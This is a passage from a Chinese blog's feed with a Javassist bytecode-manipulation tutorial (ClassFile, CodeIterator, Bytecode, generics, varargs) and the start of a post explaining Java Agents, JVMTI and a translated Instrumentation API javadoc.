title="获取ClassFile对象"></a>获取ClassFile对象</h3><p>javassist.bytecode.ClassFile 对象表示类文件。要获得这个对象，<strong>应该调用 CtClass 中的 <code>getClassFile()</code> 方法</strong>。你<strong>也可以直接从类文件构造 javassist.bytecode.ClassFile 对象</strong>。 例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BufferedInputStream fin</span><br><span class="line">    = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"Point.class"</span>));</span><br><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">new</span> DataInputStream(fin));</span><br></pre></td></tr></table></figure><p>这代码段从 Point.class 创建一个 ClassFile 对象。</p><p>ClassFile 对象可以写回类文件。</p><p>ClassFile 的 write() 将类文件的内容写入给定的 DataOutputStream。</p><p>也可以从头开始创建一个类文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = <span class="keyword">new</span> ClassFile(<span class="keyword">false</span>, <span class="string">"test.Foo"</span>, <span class="keyword">null</span>);</span><br><span class="line">cf.setInterfaces(<span class="keyword">new</span> String[] &#123; <span class="string">"java.lang.Cloneable"</span> &#125;);  </span><br><span class="line">FieldInfo f = <span class="keyword">new</span> FieldInfo(cf.getConstPool(), <span class="string">"width"</span>, <span class="string">"I"</span>); f.setAccessFlags(AccessFlag.PUBLIC); </span><br><span class="line">cf.addField(f); </span><br><span class="line">cf.write(<span class="keyword">new</span> DataOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"Foo.class"</span>)));</span><br></pre></td></tr></table></figure><p>这段代码生成了一个类文件Foo.class，实现结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Cloneable</span> </span>&#123;    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> width; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加和删除成员"><a href="#添加和删除成员" class="headerlink" title="添加和删除成员"></a>添加和删除成员</h3><p><strong>ClassFile 提供了 addField()，addMethod() 和 addAttribute()</strong>，来向类添加字段、方法和类文件属性。</p><p>注意，FieldInfo，MethodInfo 和 AttributeInfo 对象包含了一个指向 ConstPool（常量池表）对象的链接。 ConstPool 对象必须是 ClassFile 对象和添加到该 ClassFile 对象的 FieldInfo（或MethodInfo 等）对象的共同对象。 换句话说，一个FieldInfo（或MethodInfo等）对象不能在不同的ClassFile 对象之间共享。</p><p>要从 ClassFile 对象中删除字段或方法，必须首先获取包含该类的所有字段的 java.util.List 对象。 getFields() 和 getMethods() 会返回这些列表。可以通过调用List对象的 remove() 来删除字段或方法。可以以类似的方式删除属性。在 FieldInfo 或 MethodInfo 中调用 getAttributes() 以获取属性列表，并从列表中删除一个属性。</p><h3 id="遍历方法体"><a href="#遍历方法体" class="headerlink" title="遍历方法体"></a>遍历方法体</h3><p>使用 CodeIterator 可以检查方法体中的每个字节码指令，要获得 CodeIterator 对象，参考以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = ... ; </span><br><span class="line">MethodInfo minfo = cf.getMethod(<span class="string">"move"</span>);    <span class="comment">// we assume move is not overloaded. </span></span><br><span class="line">CodeAttribute ca = minfo.getCodeAttribute(); </span><br><span class="line">CodeIterator i = ca.iterator();</span><br></pre></td></tr></table></figure><p>CodeIterator 对象允许你逐个访问每个字节码指令。下面展示了一部分 CodeIterator 中声明的方法：</p><ul><li><code>void begin()</code> 移动到第一条指令</li><li><code>void move(int index)</code> 移动到指定位置的指令</li><li><code>boolean hasNext()</code> 是否有下一条指令</li><li><code>int next()</code> 返回下一条指令的索引。注意，它<strong>不返回下一条指令的操作码</strong>。</li><li><code>int byteAt（int index）</code> 返回索引处的无符号8位整数。</li><li><code>int u16bitAt（int index）</code> 返回索引处的无符号16位整数。</li><li><code>int write（byte [] code，int index）</code> 在索引处写入字节数组。</li><li><code>void insert（int index，byte [] code）</code> 在索引处插入字节数组。自动调整分支偏移量。</li></ul><p>以下代码段打印了方法体中所有的指令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CodeIterator ci = ... ;</span><br><span class="line"><span class="keyword">while</span> (ci.hasNext()) &#123;</span><br><span class="line">    <span class="keyword">int</span> index = ci.next();</span><br><span class="line">    <span class="keyword">int</span> op = ci.byteAt(index);</span><br><span class="line">    System.out.println(Mnemonic.OPCODE[op]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="生成字节码序列"><a href="#生成字节码序列" class="headerlink" title="生成字节码序列"></a>生成字节码序列</h3><p><code>Bytecode</code> 对象表示字节码指令序列。它是一个可扩展，可增长的字节码数组。<br>以下是示例代码段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ConstPool cp = ...;    <span class="comment">// constant pool table</span></span><br><span class="line">Bytecode b = <span class="keyword">new</span> Bytecode(cp, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">b.addIconst(<span class="number">3</span>);</span><br><span class="line">b.addReturn(CtClass.intType);</span><br><span class="line">CodeAttribute ca = b.toCodeAttribute();</span><br></pre></td></tr></table></figure><p>这段代码产生以下序列的代码属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconst_3</span><br><span class="line">ireturn</span><br></pre></td></tr></table></figure><p>还可以通过调用 Bytecode 中的 get() 方法来获取包含此序列的字节数组。获得的数组可以插入另一个代码属性中。</p><p>Bytecode 提供了许多方法来添加特定的指令，例如使用 addOpcode() 添加一个 8 位操作码，使用 addIndex() 用于添加一个索引。每个操作码的值定义在 Opcode 接口中。</p><p>addOpcode() 和添加特定指令的方法，会自动维持最大堆栈深度，除非控制流没有分支。最大堆栈深度这个值可以通过调用 Bytecode 的 getMaxStack() 方法来获得。它也反映在从 Bytecode对象构造的 CodeAttribute 对象上。要重新计算方法体的最大堆栈深度，可以调用 CodeAttribute 的 computeMaxStack() 方法。</p><p>可以使用Bytecode来构造一个方法。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ClassFile cf = ...</span><br><span class="line">Bytecode code = <span class="keyword">new</span> Bytecode(cf.getConstPool());</span><br><span class="line">code.addAload(<span class="number">0</span>);</span><br><span class="line">code.addInvokespecial(<span class="string">"java/lang/Object"</span>, MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">code.addReturn(<span class="keyword">null</span>);</span><br><span class="line">code.setMaxLocals(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">MethodInfo minfo = <span class="keyword">new</span> MethodInfo(cf.getConstPool(), MethodInfo.nameInit, <span class="string">"()V"</span>);</span><br><span class="line">minfo.setCodeAttribute(code.toCodeAttribute());</span><br><span class="line">cf.addMethod(minfo);</span><br></pre></td></tr></table></figure><p>这段代码制作了默认的构造函数，并将其添加到cf指定的类中，Bytecode对象首先被转换为CodeAttribute对象，然后添加到minfo指定的方法中。最后将该方法添加到类文件cf中。</p><h3 id="注解-元标签"><a href="#注解-元标签" class="headerlink" title="注解 元标签"></a>注解 元标签</h3><p>注释作为运行时不可见（或可见）的注记属性，存储在类文件中。</p><p>调用 getAttribute（AnnotationsAttribute.invisibleTag）方法，可以从 ClassFile，MethodInfo 或 FieldInfo 中获取注记属性。</p><p>更多信息，请参阅 <code>javassist.bytecode.AnnotationsAttribute</code> 和<code>javassist.bytecode.annotation</code> 包的 javadoc 手册。</p><p>Javassist还允许你通过更高级别的API访问注解。如果你想通过CtClass访问注解，在CtClass或CtBehavior中调用getAnnotations()。</p><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>Javassist 的低级别 API 完全支持 Java 5 引入的泛型。但是，高级别的API（如CtClass）不直接支持泛型。</p><p>Java的泛型是通过擦除技术实现的。在编译之后，所有的类型参数都会被丢掉。例如，假设你的源代码声明了一个参数化类型Vector <String>。</String></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vector&lt;String&gt; v = <span class="keyword">new</span> Vector&lt;String&gt;();</span><br><span class="line">  :</span><br><span class="line">String s = v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>编译后的字节码等价于以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vector v = <span class="keyword">new</span> Vector();</span><br><span class="line">  :</span><br><span class="line">String s = (String)v.get(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>所以当你写字节码变换器时，你可以直接放弃所有类型参数。</p><p>由于<strong>Javassist中嵌入的编译器不支持泛型</strong>，所以如果源代码是由Javassist编译的，例如通过CtMethod.make()，<strong>必须在调用者处插入一个显式类型转换</strong>。如果源代码是由普通的Java编译器（如javac）编译的，则无需进行类型转换。</p><p>例如，如果你有一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wrapper</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  T value;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Wrapper</span><span class="params">(T t)</span> </span>&#123; value = t; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并想添加一个接口 Getter<T> 到类 Wrapper<T>：</T></T></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Getter</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function">T <span class="title">get</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么你真正要添加的接口其实是Getter（将类型参数<T>丢掉），最后你添加到 Wrapper 类的方法是这样的：</T></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> value; &#125;</span><br></pre></td></tr></table></figure><p>注意，不需要类型参数。 由于 get 返回一个 Object，如果源代码是由 Javassist 编译的，那么在调用方需要进行显式类型转换。 例如，如果类型参数 T 是 String，则必须插入（String），如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Wrapper w = ...</span><br><span class="line">String s = (String)w.get();</span><br></pre></td></tr></table></figure><p>如果你需要在运行时通过反射使类型参数可以访问，你必须在类文件中添加通用签名。更多的细节，请参见CtClass中setGenericSignature方法的API文档（javadoc）。</p><h2 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h2><p>目前，Javassist 不直接支持可变参数。 因此，要使用 varargs 创建方法，必须<strong>显式设置方法修饰符</strong>。假设要定义下面这个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123; <span class="keyword">return</span> args.length; &#125;</span><br></pre></td></tr></table></figure><p>使用 Javassist 应该是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtClass cc = <span class="comment">/* target class */</span>;</span><br><span class="line">CtMethod m = CtMethod.make(<span class="string">"public int length(int[] args) &#123; return args.length; &#125;"</span>, cc);</span><br><span class="line">m.setModifiers(m.getModifiers() | Modifier.VARARGS);</span><br><span class="line">cc.addMethod(m);</span><br></pre></td></tr></table></figure><p>参数类型<code>int ...</code>被更改为<code>int []</code>，<code>Modifier.VARARGS</code>被添加到方法修饰符中。</p><p>要在由 Javassist 的编译器编译的源代码中调用此方法，需要这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;);</span><br></pre></td></tr></table></figure><p>而不是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;醉里挑灯看剑，梦回吹角连营。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Javassist相关知识 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Javassist" scheme="https://0range228.github.io/tags/Javassist/"/>
    
  </entry>
  
  <entry>
    <title>Java Agent解读</title>
    <link href="https://0range228.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/"/>
    <id>https://0range228.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/</id>
    <published>2021-02-01T13:37:00.000Z</published>
    <updated>2021-02-10T15:06:45.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>空山新雨后，天色晚来秋。</p></blockquote><p>整理Java Agent相关知识 。</p><a id="more"></a><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载。</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207121651182.png" alt="image-20210207121651182"></p><h2 id="JVMTI"><a href="#JVMTI" class="headerlink" title="JVMTI"></a>JVMTI</h2><p><strong>==万物起源==</strong></p><p>JVMTI(JVM Tool Interface)是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。</p><h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p>在Java SE 5之前，要实现一个Agent只能通过编写Native代码来实现。</p><p>从Java SE 5开始，可以使用Java的Instrumentation接口（<strong>java.lang.instrument</strong>包）来编写Agent。</p><p>从而 Java SE 6 的新特性改变了这种情况，通过 Java Tool API 中的 <strong>attach</strong> 方式，我们可以很方便地在运行过程中动态地设置加载代理类，以达到Instrumentation的目的。</p><p>并且从Java SE 6开始，可以向native method插桩。</p><p><strong>==无论是通过Native的方式还是通过Java Instrumentation接口的方式来编写Agent，它们的工作都是借助JVMTI来进行完成。==</strong></p><h1 id="Instrumentation-1"><a href="#Instrumentation-1" class="headerlink" title="Instrumentation"></a>Instrumentation</h1><p>这里把Instrumentation单独拿出来细说<code>java.lang.instrument.Instrumentation</code>.</p><p>Instrumentation接口设计初衷是为了收集Java程序运行时的数据，用于监控运行程序状态，记录日志，分析代码用的。</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210207135925174.png" alt="image-20210207135925174"></p><p>目前可以实现(对应JVM方法)：</p><ol><li><p>动态添加或移除自定义的<code>ClassFileTransformer</code>（<code>addTransformer/removeTransformer</code>）</p><p>JVM会在类加载时调用Agent中注册的<code>ClassFileTransformer</code>；</p></li><li><p>动态修改<code>classpath</code>（<code>appendToBootstrapClassLoaderSearch</code>、<code>appendToSystemClassLoaderSearch</code>）</p><p>将Agent程序添加到<code>BootstrapClassLoader</code>和<code>SystemClassLoaderSearch</code>（对应的是<code>ClassLoader类的getSystemClassLoader方法</code>，默认是<code>sun.misc.Launcher$AppClassLoader</code>）中搜索；</p></li><li><p>动态获取所有<code>JVM</code>已加载的类(<code>getAllLoadedClasses</code>)；</p></li><li><p>动态获取某个类加载器已实例化的所有类(<code>getInitiatedClasses</code>)。</p></li><li><p>重定义某个已加载的类的字节码(<code>redefineClasses</code>)。</p></li><li><p>动态设置<code>JNI</code>前缀(<code>setNativeMethodPrefix</code>)，可以实现Hook native方法。</p></li><li><p>重新加载某个已经被JVM加载过的类字节码(<code>retransformClasses</code>)。</p></li></ol><p>两种部署模式：</p><p>Java Agent支持目标JVM启动时加载，也支持在目标JVM运行时加载，这两种不同的加载模式会使用不同的入口函数。</p><p>Java Agent和普通的Java类并没有任何区别，普通的Java程序中规定了<code>main</code>方法为程序入口，而Java Agent则将<code>premain</code>（Agent模式）和<code>agentmain</code>（Attach模式）作为了Agent程序的入口，两者所接受的参数是完全一致的。</p><p><code>Instrumentation</code>类方法如下：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210202230129428.png" alt="image-20210202230129428"></p><p>学习API最好的方法就是阅读JavaDoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.lang.instrument;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    该类提供了工具化Java编程语言代码所需的服务。</span><br><span class="line">    仪表化是指在方法中添加字节码，以收集数据，供工具使用。</span><br><span class="line">    由于这些变化是纯粹的加法，所以这些工具不会修改应用程序的状态或行为。</span><br><span class="line">    这种良性工具的例子包括监控代理、剖析器、覆盖率分析器和事件记录器。</span><br><span class="line">    </span><br><span class="line">    下面有两种方式来实例化Instrumentation接口：</span><br><span class="line">      <span class="number">1</span>.当JVM启动时，-javaagent：Agent.jar 指示代理类。在这种情况下，premain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">      <span class="number">2</span>.当JVM启动之后，可以Attach目标进程上。在这种情况下，agentmain方法会接收一个Instrumentation实例作为入参。</span><br><span class="line">     </span><br><span class="line">    一旦Agent获得一个Instrumentation实例，代理可以在任何时候调用实例上的方法。</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addTransformer</span><span class="params">(ClassFileTransformer transformer,<span class="keyword">boolean</span> canRetransform)</span></span></span><br><span class="line"><span class="function">      注册所提供的Tranformer。从此以后所有类定义都会被Tranformer看到，但不包括任何已注册的Transformer所依赖的类的定义。</span></span><br><span class="line"><span class="function">      当类被加载时，当类被重新定义时，Tranformer被调用；</span></span><br><span class="line"><span class="function">      如果 canRetransform 为真，当类被重新转换时，变压器被调用。</span></span><br><span class="line"><span class="function">    变换调用的顺序请参见 ClassFileTransformer.transformer。</span></span><br><span class="line"><span class="function">    如果一个Transformer在执行过程中抛出了异常，JVM仍然会依次调用其他注册的Transformer。</span></span><br><span class="line"><span class="function">    同一个Transformer可以被添加一次以上，但强烈不鼓励这样做，可以通过创建一个新的Transformer实例来避免这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span></span><br><span class="line"><span class="function">      解除所提供的Transformer注册。今后的类定义将不会显示给Transformer。</span></span><br><span class="line"><span class="function">      删除Transformer最近添加的匹配实例。由于类加载的多线程特性，Transformer在被删除后可能会收到调用。</span></span><br><span class="line"><span class="function">      Transformer的编写应考虑到这种情况。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRetransformClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新转换。</span></span><br><span class="line"><span class="function">      重构已经加载的类的能力是JVM的一个可选能力，只有当代理JAR中的Can-Retransform-Classes manifest属性被设置为<span class="keyword">true</span>时，才支持重构。</span></span><br><span class="line"><span class="function">      只有在代理 JAR 文件中 Can-Retransform-Classes manifest 属性被设置为 <span class="keyword">true</span>（如包规范中所述）且 JVM 支持此能力时，才会支持重构。</span></span><br><span class="line"><span class="function">      在单个JVM的单个实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException</span></span><br><span class="line"><span class="function">      给Class&lt;?&gt; classes 中的若干类进行转换。</span></span><br><span class="line"><span class="function">      该方法便于对已经加载的类进行转换。</span></span><br><span class="line"><span class="function">      当类被初始加载或重新定义时，可以使用ClassFileTransformer对初始类文件字节进行转换。</span></span><br><span class="line"><span class="function">      这个函数会重新运行转换过程（无论之前是否发生过转换）。</span></span><br><span class="line"><span class="function">      重新转换遵循以下步骤：</span></span><br><span class="line"><span class="function">      1. 从初始的类文件字节开始</span></span><br><span class="line"><span class="function">      2. 对于每个添加了 canRetransform <span class="keyword">false</span> 的Transformer，由 transform 返回的字节将被重新使用，作为变换的输出，不做任何修改；</span></span><br><span class="line"><span class="function">      3. 对于每个添加了 canRetransform <span class="keyword">true</span> 的Transformer，这些Transformer都会调用 transform 方法。</span></span><br><span class="line"><span class="function">      4.转化后的类文件字节被安装为类的新定义。</span></span><br><span class="line"><span class="function">      变换的顺序在 transform 方法中描述。这个相同的顺序被用于自动重新应用无法变换的变换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      初始类文件的字节代表传递给ClassLoader.defineClass或redefineClasses的字节（在任何转换行为之前），然而它们可能不完全匹配。常量池可能没有相同的布局或内容。常量池可能有更多或更少的条目。常量池条目的顺序可能不同，但是，方法字节码中的常量池索引会对应。一些属性可能不存在。在顺序没有意义的地方，例如方法的顺序，顺序可能不会被保留。</span></span><br><span class="line"><span class="function">      该方法会在一个集合上操作（看入参的形式就是一个不定数组），以允许同时对多个类进行相互依赖的改变（类 A 的重构可能需要类 B 的重构）。</span></span><br><span class="line"><span class="function">      如果一个重构的方法有高频活动的栈帧，这些活动帧将继续运行原方法的字节码。重构后的方法将在新的调用.<span class="title">invoke</span><span class="params">()</span>中使用。</span></span><br><span class="line"><span class="function">      这个方法不会引起任何初始化.换句话说，重新定义一个类不会导致其初始化。静态变量的值将保持在调用之前的状态。</span></span><br><span class="line"><span class="function">      重构后的类的实例不会受到影响。</span></span><br><span class="line"><span class="function">      重构可以改变方法体、常量池和类属性。重构不能增加、删除或重命名字段或方法，不能改变方法的签名，也不能改变继承。这些限制也许会在未来的版本中被取消。类文件字节的检查、验证和安装直到应用了转换之后才会进行，如果结果字节有错误，这个方法将抛出一个异常。</span></span><br><span class="line"><span class="function">      如果本方法抛出异常，说明没有类被重新转换。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRedefineClassesSupported</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回当前JVM配置是否支持类的重新定义。</span></span><br><span class="line"><span class="function">      重新定义已经加载的类的能力是JVM的一个可选能力，只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义。</span></span><br><span class="line"><span class="function">      只有当代理JAR文件中的Can-Redefine-Classes manifest属性被设置为<span class="keyword">true</span>时，才会支持重新定义（如包规范中所述），并且JVM支持该能力。在单个JVM的单次实例化过程中，对该方法的多次调用将始终返回相同的答案。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">redefineClasses</span><span class="params">(ClassDefinition... definitions)</span> <span class="keyword">throws</span> ClassNotFoundException,</span></span><br><span class="line"><span class="function">                     UnmodifiableClassException</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      使用提供的类文件重新定义提供的类集。</span></span><br><span class="line"><span class="function">      这个方法用于替换类的定义，而不引用现有的类文件字节。</span></span><br><span class="line"><span class="function">      就像从源码重新编译以进行修复和继续调试时一样。当现有的类文件字节要被转换时（例如在字节码instrumentation中），应该使用retransformClasses。</span></span><br><span class="line"><span class="function">      这个方法在一个集合上操作，以便允许同时对多个类进行相互依赖的改变（对类A的重新定义可能需要对类B的重新定义）。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span></span></span><br><span class="line"><span class="function">      确定一个类是否可以通过retransformClasses或redefineClasses进行修改。如果一个类是可修改的，那么本方法返回<span class="keyword">true</span>。如果一个类是不可修改的，那么这个方法返回<span class="keyword">false</span>。</span></span><br><span class="line"><span class="function">      要想对一个类进行重构，<span class="title">isRetransformClassesSupported</span><span class="params">()</span>也必须为真。但是is的值不会影响这个函数返回的值。要想重新定义一个类，<span class="title">isRedefineClassesSupported</span><span class="params">()</span>也必须为真，但<span class="title">isRedefineClassesSupported</span><span class="params">()</span>的值不会影响这个函数返回的值。</span></span><br><span class="line"><span class="function">      基元类（例如java.lang.Integer.TYPE）和数组类是永远不能修改的。                 </span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Class[] <span class="title">getAllLoadedClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      返回JVM当前加载的所有类的数组。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function">Class[] <span class="title">getInitiatedClasses</span><span class="params">(ClassLoader loader)</span></span></span><br><span class="line"><span class="function">      返回一个数组，该数组包含了所有由loader加载的类。如果提供的Loader为空，则返回由bootstrap类Loader加载的类。</span></span><br><span class="line"><span class="function">      </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">getObjectSize</span><span class="params">(Object objectToSize)</span></span></span><br><span class="line"><span 